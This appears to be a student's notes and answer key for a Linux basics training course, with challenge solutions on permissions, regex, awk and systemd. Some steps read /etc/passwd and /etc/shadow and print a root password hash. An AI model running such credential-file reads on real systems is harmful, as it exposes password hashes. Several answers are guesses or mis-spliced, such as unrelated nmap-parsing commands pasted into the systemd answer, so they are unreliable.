


^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/////////////////  LINUX BASICS   /////////////////^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Link -> https://os.cybbh.io/public/os/latest/003_linux_essentials/bash_fg.html

student:~$ ls -l                                                                          # ls -l changes the output to long list format.
student:~$ ls --help                                                                      # Running a command with an argument to get help
student:~$ directories=$(ls /)                                                            # Assign the variable directories to the output of the ls / command. Note the $().
student:~$ echo $directories                                                              # Execute the echo command the contents of the variable directories.
workstation21:$ echo $directories 1> thisisanewfile                                       # Send the standard output from the $directories variable into a file named thisisanewfile.
workstation21:$ ls bacon 2> errorfile                                                     # Send the standard error from the command to errorfile.
student:~$ ls -Rlisa /etc | grep syslog                                                   # Execute ls with arguments, then send the output to grep command using a pipe | to filter for the string syslog.
student:~$ ls -Rlisa /etc 2> /dev/null | grep syslog                                      # To remove all errors from your output, consider utilizing standard error redirection. 

student:~$ objects=$(ls -d /etc/*)
student:~$ for item in $objects; do echo $item; done                                      # Making a For Loop to iterate on Objects in the collection of Objects
                                   

student:~$ for object in $objects; do if [ -d $object ]; then echo "$object is a directory"; else echo "$object is a file" ; fi ; done              # One liner version of the if statement.

student:~$ for object in $objects; \                                                      # 1 The beginning of the for loop like in section 2.1.
do if [ -d $object ]; then echo "$object is a directory"; \                               # 2 if $object is a directory AND it exists, then run echo "$object is a directory".
else echo "$object is file" ; \                                                           # 3 else echo "$object is a file".
fi ; \                                                                                    # 4 ends the if statements.
done                                                                                      # 5 ends the for loop started in 1.

while [ 1 -eq 1 ]; do echo "To Infinity and Beyond!"; done                                # Making a basic while loop. Runs forever. While 1 equals 1, run the command echo ""To Infinity and Beyond!".

student@linux-opstation-kspt:/$ls -l $PWD/*                                               # Execute ls in long list format with absolute path.
student@linux-opstation-kspt:/bin$ ls -l                                                  # Execute ls in long list format with relative paths.

student@linux-opstation-kspt:/bin$ cat ls | head -n 1                                     # Execute cat on ls, then send its standard output to the head command and trim output to display a single row.
student@linux-opstation-kspt:/bin$ xxd ls | head -n 2                                     # Execute xxd on ls, then send its standard output to the head command and trim output to display to the first two rows.
                                                                                          # Look at that file signature! This file signature of 7f45 4c46 stands for Linux Executable Linked file format unique to Linux.
                                                                                          # Aside from the first few characters, that isn’t readable.

student@linux-opstation-kspt:/bin$ id                                                     # Execute the id command. Displays all of my associated ids

student@linux-opstation-kspt:/bin$ cat /etc/passwd | grep student (1)
student:x:1001:1001::/home/student:/bin/bash (2)
 (3)      (4) (5)         (6)       (7)
(1) Execute cat /etc/passwd and pipe it to grep to filter on student.
(2) My entry in the /etc/passwd file.
(3) My username.
(4) my uid value.
(5) my primary gid value.
(6) my home directory.
(7) my login shell /bin/bash.

student@linux-opstation-kspt:/bin$ cat /etc/group | grep student                          # Execute cat /etc/group and pipe it to grep to filter on student.
                                                                                          # Shows the sudo group, its gid value, its two members student and ubuntu.
                                                                                          # Shows the student group, its gid value, and no additional members.


student@linux-opstation-kspt:/bin$ ls -lisa /bin/dd (1)
student@linux-opstation-kspt:/bin$ 130341 76 -rwx r-x r-x 1 root root 76000 Jan 18  2018 /bin/dd
                                             (2)  (3) (4)   (5)   (6)
(1) Showing permissions.
(2) The Owner has Read, Write, and Execute permissions.
(3) The Group has Read and Execute permissions.
(4) Anyone who is not the User/Owner or belonging to the Group has Read and Execute permissions.
(5) The file’s Owner.
(6) The files' Group.

student@linux-opstation-kspt:~$ ls -l /bin/ping 
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping 

## 
-: Indicates this is a file and not a directory.
rws: Read, write, and setuid permissions for the owner (root). The 's' indicates setuid is set, 
meaning when this program is run, it runs with the permissions of the file's owner, which in this case is the root user.
r-x: Read and execute permissions for the group.
r-x: Read and execute permissions for others.

##

student@linux-opstation-kspt:~$ ls -Rlisa /etc | grep password                                            # Execute ls -Rlisa then send its standard out to grep to filter for the string password.
student@linux-opstation-kspt:~$ grep -R 'network' /etc/                                                   # Execute grep -R 'network' /etc/ then send it’s standard out to grep to filter for the string network.
student@linux-opstation-kspt:~$ ls -l /etc | awk -F " " '{print$3","$4","$9}' > files.csv                 # The output from ls -l is verbose, maybe all of that information isn’t needed?
                                                                                                          # Lets send the output from ls -l into awk, then set the delimiter to blank space, 
                                                                                                            then tell it to print fields $3,$4,$9, finally send them to a csv file.

student@linux-opstation-kspt:~$ articles=$(curl -L https://www.dailymail.co.uk/ushome/index.html --output - | grep itemprop | grep href | awk -F "\"" '{print$4}'|  awk -F "/" '{print$4}')
student@linux-opstation-kspt:~$ for article in $articles; do echo $article; done

##
Perform a http GET request and filter all the HTML to get to the specific articles by grepping on itemprop, then grep on href, 
next use awk to cut output into fields separated by \ characters and select column 4, finally cut output into fields separated by / characters and select column 4.
Read the variable articles with a for loop.
##

student@linux-opstation-kspt:~$ cat /etc/passwd | grep root                                                # Execute cat on /etc/passwd then filter the output with grep to filter for root.
student@linux-opstation-kspt:~$ cat /etc/passwd | grep root | sed s/root/bacon/g                           # Using sed to change standard any standard input that matches root to bacon, then send the modified output to the screen.



student@linux-opstation-kspt:~$ echo -e "Handel\nHändel\nHaendel" > regexfile                              # Create a file with 3 similar names in it and save it as regexfile in the current directory.
student@linux-opstation-kspt:~$ grep -P "H(ä|ae?)ndel" regexfile >                                         # Use grep with -P to specify Perl regular expressions and look for :
Handel                                                                                                     # H,ä or a, e is optional, ndel.
Händel
Haendel


student@linux-opstation-kspt:~$ cat results.txt 
111-715-255643
(9279815)92-3599127
466-33836614-273
_truncated_

student@linux-opstation-kspt:~$ grep -P '\b\d{3}-\d{2}-\d{4}\b' results.txt                               # Execute grep to search for the following pattern : nnn-nn-nnnn.                        
629-75-1985
386-67-7872
478-71-4964

student@linux-opstation-kspt:~$ grep -P '\(\d{3}\)\d{3}-\d{4}\b' results.txt                              # Execute grep to search for the following pattern : (nnn)nnn-nnnn.
(267)874-4532
(446)146-8923
(548)985-5415
(199)363-3617


#########################################################################################################################################
#########################################################                       #########################################################
#########################################################    04_Linux_Basics2   #########################################################
#########################################################                       #########################################################
#########################################################################################################################################

######################################################### Linux Basics 5 10 #########################################################

Search the man pages for the keyword digest. Then, use one of the binaries listed to hash the string OneWayBestWay using the largest sha hash available.

The resulting hash is the flag.

********************************************************* SOLUTION ********************************************************

man -k digest # finds the keyword 
echo -n "OneWayBestWay" | sha512sum

######################################################### Linux Basics 6 10 #########################################################

Use File: /home/garviel/Encrypted

This file contains encrypted contents. Identify its file type, then decode its contents.

Hint: Use OpenSSL
Research: https://www.openssl.org/docs/man1.1.1/man1/enc.html

Reminder: All challenges are done using the Terra box.

********************************************************* SOLUTION ********************************************************

file Encrypted # find the type of the file

unzip Encrypted # unecrypts the file 

ls # check the 2 files that have been unencrypted one has a password and one is the encrypted file 

openssl enc -d -aes-128-cbc -in cipher -out deciphered.txt
Performed on /home/garviel/Encrypted

# check the type of file 
file Encrypted 

# unzip the encrypted file 
unzip Encrypted 

# check the contents to find which is a password file and which has encrypted text 
cat cipher # cipher text 
cat symmetric # contains the password 

#decrypt the file 
openssl enc -d -aes256 -in cipher -out cipheroutput # Enter the password from symmetric

openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -in cipher -out cipheroutput1

AES128Key

(((((((((( ASK INSTRUCTOR ))))))))))
######################################################### Linux Basics LFS Hierarchy7 10 #########################################################

Search the user home directories to find the file with the second-most lines in it. The flag is the number of lines in the file.

Hint: Exclude the VDI file!

********************************************************* SOLUTION ********************************************************

find ./ -type f | xargs wc -l

20003

######################################################### Linux Basics Users and Groups1 10 #########################################################

Read the file that contains the user database for the machine. Identify a strange comment.

********************************************************* SOLUTION ********************************************************

$ cat /etc/passwd | awk -F ':' '{print$5}' | grep -v 'nologin'

Intel Pirate

######################################################### Linux Basics Users and Groups2 10 #########################################################

Identify all members of the lodge group. List their names in alphabetical order with a comma in between each name.

Flag Format: name,name,name

********************************************************* SOLUTION ********************************************************

groups # lists the groups available 

getent group lodge | cut -d: -f4 | tr ',' '\n' | sort | paste -sd, -

aximand,erebus,ezekyle,garviel,sejanus,tarik


######################################################### Linux Basics Users and Groups3 10 #########################################################

Find the user with a unique login shell.


********************************************************* SOLUTION ********************************************************

users can use either bash, sh, find one that is unique or not being used by everyone else. 


cat passwd | awk -F ':' '{print$1$7}' # lists the passwords available 

cat passwd | awk -F ":" '{print$1","$7}' | grep -wv "nologin" # filters all nologins to remain with just a small amount

nobody # Answer


######################################################### Windows_File_System_Basics_13 15 #########################################################

Identify the algorithm, the amount of salted characters added, and the length of the hashed password in the file that stores passwords.

Hint: Research 'padding'...

Flag format: algorithm,#characters,#length

********************************************************* SOLUTION ********************************************************


Flag format: algorithm,#characters,#length

- /etc/shadow contains hashed password

cat shadow -> show hashed passwords

Pick the top hashed password -> root:$6$fSuf.jyW$NNZZMQkjGuu0S/gs0iQw8PbmRStlbJiJVT0fQc9JJa5SJztXAC9ehC.ym30ynWdwwiv8o/UABUHJdG

root:$6 (algorithm)  $fSuf.jyW(salt) $NNZZMQkjGuu0S/gs0iQw8PbmRStlbJiJVT0fQc9JJa5SJztXAC9ehC.ym30ynWdwwiv8o/UABUHJdG (number of characters and the password)

$6 -> SHA512
$fSuf.jyW -> 8
$fSuf.jyW(salt) $NNZZMQkjGuu0S/gs0iQw8PbmRStlbJiJVT0fQc9JJa5SJztXAC9ehC.ym30ynWdwwiv8o/UABUHJdG (the count of this) -> 86

SHA512,8,86

######################################################### Linux Basics Permissions1 10 #########################################################

Find the directory named Bibliotheca. Enter the absolute path to the directory.

********************************************************* SOLUTION ********************************************************

find / -type d -name "Bibliotheca" 2>/dev/null # Run a command to first find the directory

find / -type d -name "Bibliotheca" # find the directory but outputs a bunch of nonsense

/media/Bibliotheca # This is the absolute path to the directory 


######################################################### Linux Basics Permissions2 10 #########################################################

Identify the number of users with valid login shells, who can list the contents of the Bibliotheca directory.

********************************************************* SOLUTION ********************************************************

getfacl /media/Bibliotheca # Gives information on the directory. Tells you who and what group has access to that directory

getent group chapter # Lists the users in the group chapter that have access to the directory. Count the number of users manually 

Answ: 7

######################################################### Linux Basics Permissions3 10 #########################################################

The permissions that user sejanus has on /media/Bibliotheca, in octal format.

Flag format: #

HINT: Think about groups...


********************************************************* SOLUTION ********************************************************

if the read bit (r) is on the value is 4
if the write bit(w) is on the value is 2
if the execute bit (x) is on the value is 1

drwxr-xr-x 6 mephiston chapter 12288 Feb 28  2022 Bibliotheca ---> directory Bibliotheca permissions
The first 3 permissions belong to the owner, the next permissions belong to group members and the last 2 permissions belongs to anyone else 

getent group chapter -> gives the users as garviel,tarik,aximand,ezekyle,sejanus,erebus,mephiston

ls -l /media/Bibliotheca/ -> Gives the output below meaning that the owener of teh directory is mephiston. That makes sejanus just any other regular owner.  

drwxr-xr-x 7 mephiston chapter 4096 Mar 22  2023 Bibliotheca_duo
dr-xr-xr-x 2 mephiston chapter 4096 Mar 22  2023 Bibliotheca_quattuor
dr-xr-xr-x 2 mephiston chapter 4096 Feb 28  2022 Bibliotheca_tribus
dr-xr-xr-- 2 mephiston chapter 4096 Feb 28  2022 Bibliotheca_unus

Being that the next 3 permissions belong to the group members, we have the last two r-x of the drwxr-x and adding those with their respective values we get 5

 r(ead) has the value of 4

- w(rite) has the value of 2

- (e)x(ecute) has the value of 1

- no permission has the value of 0

So adding r+x = 5

cd /media

Ls -lisa #see permissions (rwxr-xr-x) rxr is user, r-x is group, r-x is other

R-x is 5 in octal for the group Chapter

Senjanus is in the group Chapter (5 is answer)

######################################################### Linux Basics Permissions5 10 #########################################################

Locate the file within /media/Bibliotheca that is modifiable by the only user that is part of the Chapter group, but not part of the Lodge group.

Hint: Not the hidden file...



********************************************************* SOLUTION ********************************************************

# list all users in the groups 
getent group chapter
getent group lodge 
# use ls -lh to see read and write permissions for the user that wasn't found in both chapter and lodge

ls -lh /media/Bibliotheca/Bibliotheca_unus/
ls -lh /media/Bibliotheca/Bibliotheca_duo/
ls -lh /media/Bibliotheca/Bibliotheca_quattuor/

********************************************************* SOLUTION ********************************************************




To list the files ls –lh(file name with full path ) e.g ls –lh Bibliotheca/Bibliotheca_tribus/

Codex_Hereticusls

ls -R -la | tr ' ' '' |awk -F '' '{print$1$3$4$10}' #notice r for user but rw for group Codex_Imperium

v r--rw-r-- **group has more permissions than owner

######################################################### Linux Basics Permissions4 10 #########################################################

The user tyborc is unable to access the directory:

/media/Bibliotheca/Bibliotheca_unus

Why? Identify the permission missing in standard verb form.


********************************************************* SOLUTION ********************************************************




Cd /media/Bibliotheca

cat group | grep tyborc # member of guardmen group

ls -R -la | grep unus #shows mephison and Chapter so tyborc would be other

dr-xr-xr-- 2 mephiston chapter 4096 Feb 28 19:05 Bibliotheca_unus # other is r–

execute


Based on the output you provided earlier for the /media/Bibliotheca/Bibliotheca_unus directory:

dr-xr-xr-- 2 mephiston chapter 4096 Feb 28  2022 Bibliotheca_unus

Here's the breakdown of the permissions:

The owner (mephiston) has read (r) and execute (x) permissions, which is represented as r-x.
The group (chapter) has the same permissions as the owner, which is r-x.
Others have only read (r) permission, which is represented as r--.
If the user "tyborc" is neither the owner (mephiston) nor a member of the group (chapter), then "tyborc" falls under the "others" category.

For directories, the execute (x) permission determines whether a user can access (cd into) the directory. In this case, "tyborc" (being in the "others" category) does not have the execute permission for the directory /media/Bibliotheca/Bibliotheca_unus.

So, the permission missing for user "tyborc" in standard verb form is: execute.


######################################################### Linux Basics Permissions6 10 #########################################################


You only have a single submission attempt for this challenge.

Locate the file in /media/Bibliotheca that Quixos has sole modification rights on.

The flag is the absolute path for the file, include the file name.



********************************************************* SOLUTION ********************************************************


ls -R -la | grep quixos #in media bibliotheca

RETURNS 4 RESULTS:

rw------- 1 quixos quixos 3609 Feb 28 19:05 Codex_Hereticus

--xr-xrwx 1 quixos quixos 3609 Feb 28 19:05 Codex_Hereticus

r----xrwx 1 quixos quixos 3609 Feb 28 19:05 Codex_Hereticus

r--r--r-- 1 quixos quixos 3609 Feb 28 19:05 Codex_Hereticus

/media/Bibliotheca/Bibliotheca_unus/Codex_Hereticus

BACK OUT TO /

find -name 'Codex_Hereticus'

RETURNS 4 PATHS

./media/Bibliotheca/Bibliotheca_unus/Codex_Hereticus

./media/Bibliotheca/Bibliotheca_duo/Codex_Hereticus

./media/Bibliotheca/Bibliotheca_quattuor/Codex_Hereticus

./media/Bibliotheca/Bibliotheca_tribus/Codex_Hereticus

cd Bibliotheca_duo #DOUBLE CHECKING THIS IS THE CORRECT ONE

ls -lisa |grep quixos

258835 4 -rw------- 1 quixos quixos 3609 Feb 28 19:05 Codex_Hereticus 

/media/Bibliotheca/Bibliotheca_duo/Codex_Hereticus

######################################################### Linux Basics Permissions7 10 #########################################################

Identify the file within /media/Bibliotheca where the owning group has more rights than the owning user.

********************************************************* SOLUTION ********************************************************

find /media/Bibliotheca -type f -exec bash -c '
    for file; do
        perms=$(stat -c "%A" "$file")
        user_perms=${perms:1:3}
        group_perms=${perms:4:3}

        # Convert rwx permissions to binary form for comparison
        convert_perms() {
            echo "$1" | tr "rwx-" "1110"
        }

        user_perms_binary=$(convert_perms "$user_perms")
        group_perms_binary=$(convert_perms "$group_perms")

        if (( 2#$group_perms_binary > 2#$user_perms_binary )); then
            echo "$file : User permissions - $user_perms, Group permissions - $group_perms"
        fi
    done
' _ {} +


Codex_Hereticus
Codex_Imperium


Codex_Hereticusls
ls -R -la | tr ' ' '' |awk -F '' '{print$1$3$4$10}' #notice r for user but rw for group Codex_Imperium
v r--rw-r-- **group has more permissions than owner


######################################################### Linux Basics Permissions8 10 #########################################################

Execute the file owned by the guardsmen group in /media/Bibliotheca, as the owning user.

The flag is the code name provided after a successful access attempt.

Hint: Remember your sudo options.


********************************************************* SOLUTION ********************************************************

sudo -l # To check what access you have as garviel...this provides information on what users can you run file as
ls -lh /media/Bibliotheca/Bibliotheca_quattuor/  # Find the file owned by guardsmen. ls lsh all directories under Media/Bibliotheca..found the file as Tactica_Imperium..find the username which was gaunt 
sudo –u gaunt(username) ./(filename)  # Run the file 
sudo -u gaunt ./Tactica_Imperium  # Run the file 



To check what access you have do sudo –l ----- this provides information on what users can you run file as

Now find the file owned by guardsmen and go to that directory to execute the file:

To run the file sudo –u gaunt(username) ./(filename) 

NOPASSWD
sudo -u gaunt ./Tactica_Imperium
######################################################### Linux Basics Permissions9 10 #########################################################

Read the concealed file within /media/Bibliotheca


********************************************************* SOLUTION ********************************************************

cd /media/Bibliotheca/Bibliotheca_duo/

ls -Al

cat .Secrets_of_the_Immaterium

The body cannot live without the mind

######################################################### Linux Basics Permissions10 10 #########################################################

Find the warp and read its secrets for the flag.

********************************************************* SOLUTION ********************************************************

find -mindepth 1 -name '.*' -type f

cd Bibliotheca_duo/.warp2/.warp5/warp5/.warp3/warp2/.secrets

ls -Al

cat .secrets

I_love_l4mp


######################################################### Linux Basics Regular Expressions1 10 #########################################################

Using the commands ls and grep, identify the number of directories in /etc/ that end in .d

********************************************************* SOLUTION ********************************************************

ls -d /etc/*.d/ 2>/dev/null | grep -c '.d/$'

######################################################### Linux Basics Regular Expressions2 10 #########################################################

File: home/garviel/numbers

Use regular expressions to match patterns similar to valid and invalid IP addresses.

The answer is the count/number of lines that match in the file.

********************************************************* SOLUTION ********************************************************

grep -cE '\b[0-9]{1,3}(\.[0-9]{1,3}){3}\b' /home/garviel/numbers

count -> 78

######################################################### Linux Basics Regular Expressions3 10 #########################################################

File: home/garviel/numbers

Use regular expressions to match valid IP addresses. The flag is the number of addresses.

HINT: What are the valid numerical values of each octet in an IP address?

********************************************************* SOLUTION ********************************************************

cat numbers | grep -E '\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}\b' | wc -l

######################################################### Linux Basics Regular Expressions4 10 #########################################################

File: home/garviel/numbers

Use regular expressions to match patterns that look similar to a MAC Address. Flag is a count of the number of matches.

HINT: This is a loose match! Some of these results won't be true MAC addresses.

Flag format: ####


********************************************************* SOLUTION ********************************************************

- here to look for the MAC using the following expression:

cat numbers | grep -E '^([0-9A-Za-z]{2}[:-]){5}([0-9A-Za-z]{2})$'

Here, 0-9 A-Za-z == means look for all the alphabets including CAP’s and small and digits 0-9

{2} = means do the same twice

{5} = do it 5 times

cat numbers | grep -E '^([0-9A-Za-z]{2}[:-]){5}([0-9A-Za-z]{2})$' | wc -l


- 4877 
######################################################### Linux Basics Reformat1 10 #########################################################

File: home/garviel/numbers

Use awk to print lines:

>= 420 AND <=1337

The flag is a SHA512 hash of the output.

********************************************************* SOLUTION ********************************************************

Awk = used for compiling and generating reports by processing files

NR built in variable stands for number of records

awk 'NR >= 420 && NR <= 1337' numbers | sha512sum

b6553aa2eae0d5fbcd36bba6181c098d8eb52d300e70e1f05867db03c9048649ad128ffb11cb9726a0709d3b5f210507640d022940ed5392840413fe55116960



37. Directory: home/garviel/Battlefield/

The garviel user has a minefield map and controls to a Titan War Machine located in their home directory. Interpret the Titan Controls to navigate the minefield and annihilate the target.

Enter the correct movement codes to make the Titan obliterate the target.


######################################################### Linux Basics Reformat2 10 #########################################################

File: home/garviel/connections

Use awk to create a separate CSV (comma separated value) file that contains columns 1-6.

The flag is an MD5 hash of the new file

Hint: Look at #fields on line 6 in the file to understand column layout.

Hint: This is a Zeek (formally known as Bro) connection log file in TSV format. Click This Link to learn about its formatting.

Sample Output


#separator \x09,,,,,
#set_separator,,,,,,
#empty_field,(empty),,,,
#unset_field,-,,,,
#path,conn,,,,
#open,2021-03-09-14-26-54,,,,
#fields,ts,uid,id.orig_h,id.orig_p,id.resp_h
#types,time,string,addr,port,addr
1615299704.748741,Cynd96jpqm760uz0k,192.168.242.216,60508,192.168.65.20,22
1615299962.756967,CFWnz12Wd2cXj3iSIe,fe80::c95c:6e92:5618:9df7,546,ff02::1:2,547
1615300118.087124,CuVCPTMljpoBDEuR1,192.168.65.10,62117,10.50.255.254,53
--- Trimmed ---

********************************************************* SOLUTION ********************************************************

awk -F '\x09' '{print$1","$2","$3","$4","$5","$6}' <connections>outputkirwa.csv # Use awk to create a separate CSV (comma separated value) file that contains columns 1-6.

md5sum outputkirwa.csv # Get the md5sum of the output 

######################################################### Linux Basics Bash Logic1 10 #########################################################

Directory: home/garviel/Battlefield/

The garviel user has a minefield map and controls to a Titan War Machine located in their home directory. Interpret the Titan Controls to navigate the minefield and annihilate the target.

Enter the correct movement codes to make the Titan obliterate the target.

Format: XXX3X2X......


********************************************************* SOLUTION ********************************************************

AAAAA3AAA3AAAABAABAAAA

######################################################### Linux Basics Bash Logic2 10 #########################################################


The flag resides in $HOME/paths... you just need to determine which flag it is. The flag sits next to a string matching the name of a $PATH/binary on your system.

Hint: The correct binary is not echo
Hint: Compare the contents

********************************************************* SOLUTION ********************************************************


# Step 1: List executables in $PATH, excluding echo
for dir in $(echo $PATH | tr ":" "\n"); do
  for file in "$dir"/*; do
    if [[ -x $file && ! -d $file && $(basename "$file") != "echo" ]]; then
      echo $(basename "$file")
    fi
  done
done > /tmp/path_binaries.txt

# Step 2: List files in $HOME/paths
ls $HOME/paths > /tmp/home_paths.txt

# Step 3: Compare lists to find the matching file name
grep -Fx -f /tmp/path_binaries.txt /tmp/home_paths.txt

# If a matching file name is found, it will be output by grep.
# Suppose the matching file name is "flagfile", you would then examine it:

# Step 4: Examine the flag file
cat "$HOME/paths/flagfile"





((((((((((((((((((((((((((((((((((((((((((((()))))))))))))))))))))))))))))))))))))))))))))

Hint: The correct binary is not echo

Binaries Path--- usr/bin and usr/sbin

Here,

Go to home/garviel and open the file 

Here,

Go to home/garviel and open the file

Go to usr binary in this case usr/bin ---- send the output of this file to:

sudo ls > /home/garviel/output.txt

Once both outputs are there compare the paths and output.txt file for a common string

grep -Ff /home/garviel/output.txt paths

Here, we are comparing output.txt with path. Once we get complete string there are 2 of them.. Python and viewless

To see which one os on the output.txt file : cat output.txt | grep python

- this gives the answer 

######################################################### Linux Basics Regular Expressions5 15 #########################################################

File: home/garviel/numbers

Use regular expressions to find valid Locally Administered or Universally Administered Unicast MAC addresses.

Give the count of Locally and Universally Administered MAC addresses as the answer.

HINT: What characters specifically define a Locally or Universally Administered Unicast MAC Address?

********************************************************* SOLUTION ********************************************************

grep -Eo '^([0-9A-Fa-f])([02468ACE])[:-]([0-9A-Fa-f]{2}[:-]){4}([0-9A-Fa-f]{2})$' numbers | wc -l ------> answer 178


((((((((((((((((((((((((((((((((((((((((((((()))))))))))))))))))))))))))))))))))))))))))))

awk -F '\x09' '{print$1","$2","$3","$4","$5","$6}' <connections>output.csv

Here, read the connection file separated by \x09 and print all 6 line separated by comma and output to output.csv

To get the md5sum md5su output.csv 

######################################################### Linux Basics Bash Logic2 10 #########################################################

The flag resides in $HOME/paths... you just need to determine which flag it is. The flag sits next to a string matching the name of a $PATH/binary on your system.

Hint: The correct binary is not echo
Hint: Compare the contents

********************************************************* SOLUTION ********************************************************

((((((((((((((((((()))))))))))))))))))

jsonpatch
jsonpointer
jsonschema


Vrc0vw7ZUaLBpQp

######################################################### Primer_Auditing_2 1 #########################################################

What term is most appropriate when referring to the process of reviewing log files or other records for specified period?

********************************************************* SOLUTION ********************************************************

Auditing


######################################################### Linux Basics Bash Logic3 15 #########################################################

FILE: /home/garviel/Inquisition_Targets

Identify heresy by comparing the Inquisition_Targets file to members of the Guardsmen group.

HINT: Reformat and clean up the data before it is compared. awk and sort are your best friends!

The flag is the number of heretics on the system.

********************************************************* SOLUTION ********************************************************

# Extract Guardsmen Group Members:
# First, extract the members of the Guardsmen group. This can typically be done by looking at the /etc/group file, but the exact method might depend on how your system manages user groups.

### Answer should be 8 --> guesswork!!! 

getent group guardsmen | awk -F':' '{print $4}' | tr ',' '\n' | sort > guardsmen_sorted.txt

# Prepare Inquisition_Targets File:
# Format and sort the Inquisition_Targets file. The exact command depends on the format of this file. Assuming it's a list that needs to be sorted:

sort /home/garviel/Inquisition_Targets > inquisition_sorted.txt

# Compare the Files:
# Compare the two files to find lines in Inquisition_Targets that are not in Guardsmen members.
# The -23 option with comm suppresses lines unique to the second file (guardsmen) and lines common to both, effectively listing only the heretics.

comm -23 inquisition_sorted.txt guardsmen_sorted.txt

# Count the Number of Heretics:
# To count the number of heretics:

comm -23 inquisition_sorted.txt guardsmen_sorted.txt | wc -l


### Not accepting 32 as the answer

getent group guardsmen | cut -d: -f4 | tr ',' '\n' | sort | uniq > guardsmen_sorted_2.txt

cat /home/garviel/Inquisition_Targets | sort | uniq > inquisition_sorted_2.txt

comm -23 inquisition_sorted_2.txt guardsmen_sorted_2.txt > heretics_2.txt

######################################################### Linux Boot Systemd 3 10 #########################################################

What unit does the graphical.target want to start, based solely on its configuration file?

HINT: Targets deal with which init system? Which machine should you be looking for this flag, on?

NOTE: Use the SystemD Machine for this question.

********************************************************* SOLUTION ********************************************************

# To determine which unit graphical.target wants to start, based solely on its configuration file in a system using systemd (which is the init system in #question), you'll need to check the actual configuration file for graphical.target.

# The graphical.target is typically found in /etc/systemd/system or /lib/systemd/system. You can view the contents of this file to understand what units it is # configured to start.

# Here is the command you would run on the systemd machine:

cat /etc/systemd/system/graphical.target

or 

cat /lib/systemd/system/graphical.target


# In the graphical.target file, look for lines under [Unit] section starting with Wants= or Requires=. These lines will list the units that graphical.target is # configured to start.
# For example, if the file contains a line like Wants=display-manager.service, it means graphical.target wants to start display-manager.service.
# Remember, this needs to be done on a machine with systemd, and you might need appropriate permissions to view these files.

Answer ---> Wants=display-manager.grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum


grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum

grep -E 'addr=|state="filtered"' /home/garviel/output.xml | \
awk '/addr=/ {ip=$0; next} /state="filtered"/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum

grep -E 'addr=|state=' /home/garviel/output.xml | \
grep -v 'state="closed"' | \
awk '/addr=/ {ip=$0; next} /state=/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum

awk '/<host>/ {rec=""; ip=""; f=0} /<host>/,/<\/host>/ {rec = rec $0 ORS} /<state state="open"/ {f=1} /<\/host>/ {if (f) print rec}' /home/garviel/output.xml | \
grep -oP 'addr="\K[^"]*' | \
tr -d '\n' | \
md5sum

awk '
BEGIN { RS="</host>"; FS="\n"; OFS="" }
/state="open"/ {
  for (i=1; i<=NF; i++) {
    if ($i ~ /<address addr=/) {
      gsub(/.*addr="|".*/, "", $i);
      printf $i
    }
  }
}
' /home/garviel/output.xml | md5sum
service

grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum


grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum

grep -E 'addr=|state="filtered"' /home/garviel/output.xml | \
awk '/addr=/ {ip=$0; next} /state="filtered"/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum

grep -E 'addr=|state=' /home/garviel/output.xml | \
grep -v 'state="closed"' | \
awk '/addr=/ {ip=$0; next} /state=/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum





awk '/<host>/ {rec=""; ip=""; f=0} /<host>/,/<\/host>/ {rec = rec $0 ORS} /<state state="open"/ {f=1} /<\/host>/ {if (f) print rec}' /home/garviel/output.xml | \
grep -oP 'addr="\K[^"]*' | \
tr -d '\n' | \
md5sum



awk '
BEGIN { RS="</host>"; FS="\n"; OFS="" }
/state="open"/ {
  for (i=1; i<=NF; i++) {
    if ($i ~ /<address addr=/) {
      gsub(/.*addr="|".*/, "", $i);
      printf $i
    }
  }
}
' /home/garviel/output.xml | md5sum


######################################################### Linux Boot Systemd 4 10 #########################################################

What dependency to graphical.target will stop it from executing if it fails to start, based solely on its static configuration file?

NOTE: Use the SystemD Machine for this question.

********************************************************* SOLUTION ********************************************************

cat /etc/systemd/system/graphical.target

or 

cat /lib/systemd/system/graphical.target

# In the file, look for lines under the [Unit] section that start with Requires=. The units listed there are essential for graphical.target to execute, and if # any of them fail, graphical.target will not proceed.
# For example, if the file contains a line like Requires=multi-user.target, it means graphical.target requires multi-user.target to start successfully, and if # multi-user.target fails, graphical.target will not execute.
# Remember, you need to perform this on a machine running systemd, and you might need appropriate permissions to view these files.

Description=Graphical Interface
Documentation=man:systemd.special(7)
Requires=multi-user.target
Wants=display-manager.service
Conflicts=rescue.service rescue.target
After=multi-user.target rescue.service rescue.target display-manager.service
AllowIsolate=yes

######################################################### Linux Boot Systemd 5 10 #########################################################

How many wants dependencies does SystemD actually recognize for the default.target

HINT: Use the systemctl command with some arguments to make life easier.

Flag format: #

NOTE: Use the SystemD Machine for this question.

********************************************************* SOLUTION ********************************************************

systemctl list-dependencies default.target --> count only the parent .service ones.... 

systemctl list-dependencies default.target --plain | grep '.wants' | wc -l

systemctl show -p Wants graphical.target

((((((WHY DOESN'T THIS WORK???))))))

######################################################### Linux Boot Systemd 6 10 #########################################################

What is the full path to the binary used for standard message logging?

HINT: Standard message logging is standardized across UNIX systems.

NOTE: As the challenge name suggests, use the SystemD machine for this question.
|||
Flag format: /absolute/path

********************************************************* SOLUTION ********************************************************

/usr/sbin/rsyslogd

which systemd-journald

lookup syslog and then go down that path.... focus on binary for syslog


######################################################### Linux Boot Grub 10 #########################################################

